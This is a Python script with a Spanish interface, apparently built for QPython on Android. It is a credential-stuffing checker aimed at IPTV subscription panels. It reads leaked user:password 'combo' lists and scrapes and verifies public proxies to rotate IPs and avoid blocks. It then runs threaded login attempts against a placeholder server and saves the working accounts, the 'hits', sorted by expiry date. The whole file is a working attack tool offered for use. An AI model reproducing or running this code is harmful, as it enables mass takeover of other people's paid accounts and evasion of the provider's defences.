import os
import sys
import time
import random
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from colorama import init, Fore, Style

# Inicializar entorno de color de consola de manera global
init(autoreset=True)

# Rutas de almacenamiento en memoria interna Android para QPython
PATH_COMBOS = "/storage/emulated/0/qpython/scripts3/"
PATH_PROXIES = "/storage/emulated/0/proxy"
PATH_HITS = os.path.join(PATH_COMBOS, "hits_capturados.txt")

# Crear los directorios automáticamente si no existen
if not os.path.exists(PATH_PROXIES):
    os.makedirs(PATH_PROXIES)
if not os.path.exists(PATH_COMBOS):
    os.makedirs(PATH_COMBOS)

# Vincular puente nativo con el hardware de Android para sonido y vibración
try:
    import androidhelper
    droid = androidhelper.Android()
except ImportError:
    droid = None

BANNER_RECUADRO = f"""
{Fore.GREEN}{Style.BRIGHT}╔════════════════════════════════════════════════════════╗
║                                                        ║
║  {Fore.CYAN}{Style.BRIGHT}🥷🏻  DESARROLLADOR ZURDO 🇪🇨 🥷🏻                          {Fore.GREEN}║
║                                                        ║
║  {Fore.YELLOW}"Todos podemos lograrlo con dedicacion y constancia"  {Fore.GREEN}║
║                                                        ║
╚════════════════════════════════════════════════════════╝"""

# Variables globales de red y control de subprocesos
PROXIES_GLOBALES = []
USAR_PROXIES = False
ARCHIVO_PROXY_SELECCIONADO = ""

# Contadores globales de progreso en tiempo real
CONTADOR_HITS = 0
CONTADOR_BAD = 0
CONTADOR_REVISADOS = 0

def emitir_pitido_hit(datos_cuenta):
    """Ejecuta una vibración y una notificación acústica física en el teléfono Android"""
    global CONTADOR_HITS
    CONTADOR_HITS += 1
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    try:
        with open(PATH_HITS, "a", encoding="utf-8") as h_file:
            h_file.write(f"[{timestamp}] {datos_cuenta}\n")
    except:
        pass

    # Ejecución nativa del zumbador físico de Android
    try:
        if droid:
            droid.vibrate(200)
            droid.playSound(1)  # Sonido por defecto de alerta del sistema
        else:
            sys.stdout.write('\a')
            sys.stdout.flush()
    except:
        pass

def descargar_y_filtrar_proxies_vip(protocolo_str):
    """Descarga de forma autónoma proxies filtrando puertos estables de servidores"""
    url = f"https://proxyscrape.com{protocolo_str}&timeout=2000&country=all"
    try:
        headers = {"User-Agent": "Mozilla/5.0"}
        r = requests.get(url, headers=headers, timeout=8)
        if r.status_code == 200:
            lineas = r.text.splitlines()
            lineas_vip = []
            puertos_estables = ["80", "8080", "443", "3128", "8888", "1080"]
            for l in lineas:
                if ":" in l:
                    puerto = l.split(":")[-1].strip()
                    if puerto in puertos_estables or len(lineas_vip) < 500:
                        lineas_vip.append(l.strip())
            return lineas_vip
    except:
        pass
    return []

def auto_limpiar_combos_locales():
    """Analiza y purga de forma interna duplicados y líneas corruptas en tus archivos txt"""
    print(f"\n{Fore.YELLOW}🛡️  INICIANDO OPTIMIZADOR DE COMBOS INTERNO...")
    archivos = [f for f in os.listdir(PATH_COMBOS) if f.endswith('.txt') and f != "hits_capturados.txt"]
    if not archivos:
        print(f"{Fore.RED}❌ No se encontraron archivos combo .txt en la carpeta scripts3.")
        time.sleep(1.5)
        return

    for archivo in archivos:
        ruta = os.path.join(PATH_COMBOS, archivo)
        try:
            with open(ruta, "r", encoding="utf-8", errors="ignore") as f:
                lineas = f.readlines()
            original_len = len(lineas)
            limpias = list(set([l.strip() for l in lineas if ":" in l and len(l.strip()) > 3]))
            if original_len != len(limpias):
                with open(ruta, "w", encoding="utf-8") as f:
                    f.write("\n".join(limpias))
        except:
            pass
    print(f"{Fore.GREEN}[✓] Purgado automático completado en los combos locales.")
    time.sleep(1.0)

def buscador_de_hits_interno():
    """Permite filtrar el historial de aciertos buscando dominios o palabras desde consola"""
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER_RECUADRO)
    print(f"{Fore.YELLOW}🔍 BUSCADOR DE HITS INTERNO:")
    if not os.path.exists(PATH_HITS) or os.path.getsize(PATH_HITS) == 0:
        print(f"{Fore.RED}❌ Historial vacío."); input("\nEnter para volver..."); return

    criterio = input(f"{Fore.CYAN}👉 Palabra o credencial a buscar: {Fore.WHITE}").strip().lower()
    print(Fore.MAGENTA + "════════════════════════════════════════════")
    encontrados = 0
    try:
        with open(PATH_HITS, "r", encoding="utf-8") as f:
            for linea in f:
                if criterio in linea.lower():
                    print(f"{Fore.GREEN}🎯 {linea.strip()}")
                    encontrados += 1
    except: pass
    print(f"\n{Fore.GREEN}[✓] Coincidencias encontradas: {encontrados}")
    input(f"\n{Fore.WHITE}Presiona Enter para regresar al menú...")

def verificar_un_proxy(p_dict):
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        r = requests.get("https://ipify.org", headers=headers, proxies=p_dict, timeout=2.5)
        if r.status_code == 200: return True, p_dict
    except: pass
    return False, p_dict

def preguntar_y_cargar_proxies():
    global PROXIES_GLOBALES, USAR_PROXIES, ARCHIVO_PROXY_SELECCIONADO
    auto_limpiar_combos_locales()
    
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(BANNER_RECUADRO)
        print(f"{Fore.YELLOW}🛡️  SISTEMA CENTRAL DE RED IP:")
        print(f" {Fore.CYAN}{Fore.RESET} DESCARGAR PROXIES AUTOMÁTICOS VIP (Anti-Caídas)")
        print(f" {Fore.CYAN}{Fore.RESET} USAR UN ARCHIVO LOCAL DE PROXIES (.txt)")
        print(f" {Fore.CYAN}{Fore.RESET} INTERNET RESIDENCIAL DIRECTO")
        print(f" {Fore.CYAN}{Fore.RESET} 🔥 ABRIR BUSCADOR DE HITS CAPTURADOS")
        print(Fore.MAGENTA + "════════════════════════════════════════════")
        
        opc_principal = input(f"{Fore.YELLOW}👉 Opción (1-4): {Fore.CYAN}").strip()
        if opc_principal == '3': USAR_PROXIES = False; return
        if opc_principal == '4': buscador_de_hits_interno(); continue

        descarga_online = (opc_principal == '1')
        if opc_principal == '2':
            archivos = [f for f in os.listdir(PATH_PROXIES) if f.endswith('.txt')]
            if not archivos: 
                print(f"{Fore.RED}❌ No se encontraron archivos .txt en la carpeta /proxy."); time.sleep(2.0); continue
            
            print(f"\n{Fore.YELLOW}📂 ARCHIVOS DETECTADOS EN /PROXY:")
            for idx, f in enumerate(archivos, 1): 
                print(f" {Fore.CYAN}[{idx:02d}]{Fore.RESET} {f}")
            print(Fore.MAGENTA + "════════════════════════════════════════════")
            
            try:
                sel = int(input(f"{Fore.YELLOW}👉 Selecciona tu archivo de proxies: {Fore.CYAN}")) - 1
                if sel < 0 or sel >= len(archivos):
                    print(f"{Fore.RED}❌ Error: El número ingresado no está en la lista. Reintenta...")
                    time.sleep(2.0)
                    continue
                ARCHIVO_PROXY_SELECCIONADO = os.path.join(PATH_PROXIES, archivos[sel])
            except ValueError:
                print(f"{Fore.RED}❌ Error: Debes ingresar un número válido.")
                time.sleep(1.5)
                continue
        elif opc_principal == '1':
            ARCHIVO_PROXY_SELECCIONADO = os.path.join(PATH_PROXIES, "proxies_VIP.txt")
        else: 
            continue

        print(f"\n{Fore.YELLOW}🌐 PROTOCOLO REQUERIDO:\n HTTP/S  SOCKS4  SOCKS5")
        opc_proto = input(f"👉 Opción (1-3): ").strip()
        if opc_proto not in ['1', '2', '3']: 
            print(f"{Fore.RED}❌ Opción de protocolo inválida."); time.sleep(1.5); continue
            
        prefix = "http://" if opc_proto == '1' else ("socks4://" if opc_proto == '2' else "socks5h://")
        proto_api_str = "http" if opc_proto == '1' else ("socks4" if opc_proto == '2' else "socks5")

        if descarga_online:
            print(f"\n{Fore.YELLOW}[+] Descargando IPs inmunes desde APIs de servidores...")
            lineas = descargar_y_filtrar_proxies_vip(proto_api_str)
            with open(ARCHIVO_PROXY_SELECCIONADO, "w") as f: f.write("\n".join(lineas))
        else:
            try:
                with open(ARCHIVO_PROXY_SELECCIONADO, "r", errors="ignore") as f:
                    lineas = [l.strip() for l in f if l.strip() and not l.startswith("#")]
            except Exception as e:
                print(f"{Fore.RED}❌ Error al leer el archivo seleccionado: {e}"); time.sleep(2.0); continue

        if not lineas: 
            print(f"{Fore.RED}❌ El archivo de proxies seleccionado está vacío."); time.sleep(2.0); continue
            
        proxies_candidatos = [{"http": f"{prefix}{l}", "https": f"{prefix}{l}"} for l in lineas]
        print(f"\n{Fore.YELLOW}🔎 Comprobando estabilidad de {len(proxies_candidatos)} proxies robustos...")
        
        PROXIES_GLOBALES = []
        with ThreadPoolExecutor(max_workers=80) as executor:
            futs = {executor.submit(verificar_un_proxy, p): p for p in proxies_candidatos}
            for val in as_completed(futs):
                sirve, p_dict = val.result()
                if sirve: PROXIES_GLOBALES.append(p_dict)

        if PROXIES_GLOBALES:
            USAR_PROXIES = True
            print(f"{Fore.GREEN}═▶ ¡Éxito! {len(PROXIES_GLOBALES)} proxies VIP cargados de forma estable."); time.sleep(1.5)
            break
        else:
            print(f"{Fore.RED}❌ Ningún proxy de la lista respondió al test de estabilidad. Intenta con otra lista."); time.sleep(2.5)

def realizar_request_login(cuenta, proxy_asignado):
    """Ejecuta la solicitud HTTP de login y clasifica los Hits por fecha de vencimiento"""
    global CONTADOR_BAD, CONTADOR_REVISADOS
    usuario, contraseña = cuenta.split(":", 1)
    
    # ⚠️ REEMPLAZAR AQUÍ: Coloca el enlace del panel/servidor m3u que deseas testear
    target_url = "http://ejemplo-servidor-iptv.com"
    parametros = {
        "username": usuario,
        "password": contraseña
    }
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    
    try:
        response = requests.get(target_url, params=parametros, headers=headers, proxies=proxy_asignado, timeout=4.0)
        
        if response.status_code == 200 and '"status":"Active"' in response.text:
            data_json = response.json()
            user_info = data_json.get('user_info', {})
            exp_date_raw = user_info.get('exp_date', None)
            
            # Clasificación inteligente por colores y estados de tiempo
            if exp_date_raw is None or exp_date_raw == "null" or exp_date_raw == "0" or exp_date_raw == "":
                vencimiento_str = f"{Fore.CYAN}[💎 ILIMITADO / NO VENCE]{Fore.RESET}"
                tag_archivo = "ILIMITADO"
            else:
                try:
                    if str(exp_date_raw).isdigit():
                        fecha_vence = datetime.fromtimestamp(int(exp_date_raw))
                    else:
                        fecha_vence = datetime.strptime(str(exp_date_raw)[:10], "%Y-%m-%d")
                    
                    dias_restantes = (fecha_vence - datetime.now()).days
                    fecha_legible = fecha_vence.strftime("%Y-%m-%d")
                    
                    if dias_restantes <= 7:
                        vencimiento_str = f"{Fore.RED}[⚠️ VENCE PRONTO: {fecha_legible} ({dias_restantes} días)]{Fore.RESET}"
                        tag_archivo = f"VENCE_PRONTO ({fecha_legible})"
                    else:
                        vencimiento_str = f"{Fore.GREEN}[✓ VIGENTE: {fecha_legible} ({dias_restantes} días)]{Fore.RESET}"
                        tag_archivo = f"OK ({fecha_legible})"
                except:
                    vencimiento_str = f"{Fore.YELLOW}[❓ FECHA: {exp_date_raw}]{Fore.RESET}"
                    tag_archivo = f"ACTIVO_FECHA_{exp_date_raw}"

            print(f"\n{Fore.GREEN}{Style.BRIGHT}[HIT] {Fore.WHITE}{cuenta} → {vencimiento_str}")
            emitir_pitido_hit(f"{cuenta} | Estado: {tag_archivo}")
        else:
            CONTADOR_BAD += 1
    except:
        CONTADOR_BAD += 1
    
    CONTADOR_REVISADOS += 1

def iniciar_bot_checker():
    """Carga los combos optimizados y despliega el ataque de hilos simultáneos"""
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER_RECUADRO)
    
    combos_disponibles = [f for f in os.listdir(PATH_COMBOS) if f.endswith('.txt') and f != "hits_capturados.txt"]
    if not combos_disponibles:
        print(f"{Fore.RED}❌ Sube primero un archivo combo .txt a la carpeta: {PATH_COMBOS}")
        return

    print(f"{Fore.YELLOW}📂 SELECCIONA EL COMBO A LOGUEAR:")
    for idx, combo in enumerate(combos_disponibles, 1):
        print(f" {Fore.CYAN}[{idx:02d}]{Fore.RESET} {combo}")
        
    try:
        sel = int(input(f"\n{Fore.YELLOW}👉 Selecciona tu número de archivo combo: {Fore.CYAN}")) - 1
        combo_ruta = os.path.join(PATH_COMBOS, combos_disponibles[sel])
    except:
        print(f"{Fore.RED}Selección incorrecta."); return

    with open(combo_ruta, "r", encoding="utf-8") as f:
        cuentas = [l.strip() for l in f if ":" in l]

    print(f"\n{Fore.CYAN}[*] Preparando ráfagas para {len(cuentas)} cuentas...")
    print(f"{Fore.YELLOW}[*] Modo de alerta acústica activado en Hits. Procesando...\n")
    time.sleep(1.5)

    with ThreadPoolExecutor(max_workers=40) as bot_executor:
        tareas = []
        for c in cuentas:
            proxy_actual = random.choice(PROXIES_GLOBALES) if USAR_PROXIES else None
            tareas.append(bot_executor.submit(realizar_request_login, c, proxy_actual))
            
        for t in as_completed(tareas):
            sys.stdout.write(f"\r{Fore.WHITE}Revisados: {CONTADOR_REVISADOS}/{len(cuentas)} | {Fore.GREEN}Hits: {CONTADOR_HITS} | {Fore.RED}Bad/Fails: {CONTADOR_BAD}\r")
            sys.stdout.flush()

    print(f"\n\n{Fore.GREEN}[✓] ¡PROCESO DE CHECKING TERMINADO!")
    print(f"{Fore.GREEN} Total Hits obtenidos y sonados: {CONTADOR_HITS}")
    print(f"{Fore.YELLOW} Los aciertos se guardaron de manera segura en: scripts3/hits_capturados.txt")
    input("\nPresiona Enter para salir...")

if __name__ == "__main__":
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER_RECUADRO)
    for txt in ["🛸 Inicializando directorios Android...", "🧬 Desplegando hilos masivos...", "🛡️ Cargando sistema de protección IP...", "💎 Entorno unificado autónomo cargado con éxito.\n"]:
        print(Fore.CYAN + txt)
        time.sleep(0.01)
        
    preguntar_y_cargar_proxies()
    iniciar_bot_checker()
